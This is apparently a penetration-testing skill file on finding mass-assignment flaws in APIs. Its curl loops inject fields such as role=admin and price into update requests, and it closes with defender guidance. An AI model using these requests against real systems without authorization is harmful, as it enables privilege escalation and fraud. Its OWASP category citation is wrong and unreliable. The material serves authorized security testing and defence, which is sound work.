---
name: mass-assignment
description: Use when testing whether an API lets clients set fields they
  should not control (roles, prices, flags) on an authorized engagement.
  Covers discovering bindable fields, guessing privileged parameters, and
  proving impact safely. Use when testing update and create endpoints, when
  the API uses object binding frameworks, when admin-only fields exist, or
  when assessing parameter pollution style flaws in APIs.
version: 1.0.0
domain: api
lifecycle: stable
last_verified: 2026-10-23
parent: api-security-testing
requires: [api-security-testing]
extends: []
relates: [auth-attacks, secure-coding]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: curl
    version: 8.5
  - name: Python
    version: 3.12
---

Mass assignment happens when the API binds request fields directly to
internal objects without an allow-list: the client sets `role=admin` or
`price=0` alongside the legitimate fields. This skill covers testing for
it on authorized engagements: finding the bindable surface, guessing
privileged fields, and proving impact without damaging data. Frameworks
make this easy to introduce and hard to notice, which is why it survives
code review.

## Quick Workflow

1. Map update and create endpoints and their documented fields.
2. Read responses for field names the docs do not mention (the API
   tells you its object shape).
3. Inject candidate privileged fields: role, admin, price, balance,
   status.
4. Verify each injection by reading the object back.
5. Prove impact with a safe field first, then the real one with care.
6. Revert test changes and document the exact bindable fields.

## 1. Discovering the bindable surface

```bash
# The API's own responses reveal its object shape
curl -s 'https://target.example/api/users/me' \
  -H 'Authorization: Bearer TOKEN' | python3 -m json.tool | head -40
# Note every field: id, role, is_admin, balance, created_at...

# Compare documented fields (API docs) versus actual fields (responses)
# Undocumented fields in responses are the first injection candidates

# Guess privileged fields on update endpoints
for field in role is_admin admin price balance status verified; do
  echo "== $field"
  curl -s -X PATCH 'https://target.example/api/users/me' \
    -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' \
    -d "{\"nickname\":\"test\",\"$field\":\"injected\"}" \
    -o /tmp/ma.json -w '%{http_code}\n'
  grep -o "\"$field\":\"[^\"]*\"" /tmp/ma.json | head -1
done
```

Read the object back after every injection: some APIs echo the
injected value without storing it, which is noise; only stored changes
are findings.

## 2. Proving impact safely

```bash
# Safe proof pattern: inject a harmless custom field first
curl -s -X PATCH 'https://target.example/api/users/me' \
  -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' \
  -d '{"nickname":"test","proof_field":"yes"}' | grep -o '"proof_field":"[^"]*"'
# If proof_field persists, binding is open; now try the real fields

# Privilege escalation proof (only with approval, on test accounts)
curl -s -X PATCH 'https://target.example/api/users/me' \
  -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' -o /dev/null -w '%{http_code}\n'
curl -s 'https://target.example/api/users/me' \
  -H 'Authorization: Bearer TOKEN' | grep -o '"role":"[^"]*"'

# Price/balance proof: use the test store, buy the 1-credit item,
# never touch real money or real inventory
```

Revert every change: set the role back, restore the nickname, delete
the proof fields. The test account must end the engagement as it
started, minus the evidence in your notes.

## 3. Framework-specific notes

```bash
# The pattern varies by stack, but the test is the same:
# - Rails: params binding without strong parameters
# - Spring: @ModelAttribute binding extra fields
# - Express/Mongoose: Object.assign(req.body, doc)
# - Django: ModelForm with extra fields, or serializer without read_only

# Nested objects widen the surface: try injecting into sub-objects
curl -s -X PATCH 'https://target.example/api/users/me' \
  -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' \
  -d '{"profile":{"nickname":"t"},"role":"admin"}' -o /tmp/nested.json -w '%{http_code}\n'

# Array and deep-nesting variants for parsers that merge recursively
```

When you find one bindable privileged field, test the whole object:
frameworks that allow-list nothing usually allow everything, and the
report should name every field you confirmed.

## Edge cases

- The API strips unknown fields. Verify by reading back; stripped is
  the correct behavior, and the test is negative.
- The field binds but has no effect. A `role` field that stores but is
  never read is a latent issue; note it as defense-in-depth, not as
  privilege escalation.
- The injection needs admin to matter. Test as the low user; an admin
  setting their own fields is not a finding.
- The API version differs. Test every version in scope; v1 may
  allow-list while v2 binds everything.

## Escalation

- Mass assignment confirmed on a critical field: demonstrate the impact
  chain (set role, access admin function) with approval, then revert.
- The whole API binds openly: report the pattern once with the full
  field list, and recommend allow-list binding as the systemic fix.
- You need the developer's view: ask for the binding code location to
  cite the exact fix point in the report.

## Detection and defender view

Defenders see mass assignment testing as update requests carrying
unexpected fields, which good API logging captures. The defense is
allow-list binding (only documented fields bind), read-only markers on
sensitive fields, and tests that submit extra fields in CI. Frameworks
offer the protection; teams must turn it on. Log and alert on requests
with undocumented fields as a canary for probing.

## Key references

- OWASP API Security Top 10 2023: API6 Unrestricted Access to Sensitive
  Business Flows (mass assignment family).
- CWE-915 (Improperly Controlled Modification of Dynamically-Determined
  Object Attributes).
- CWE-20 (Improper Input Validation).
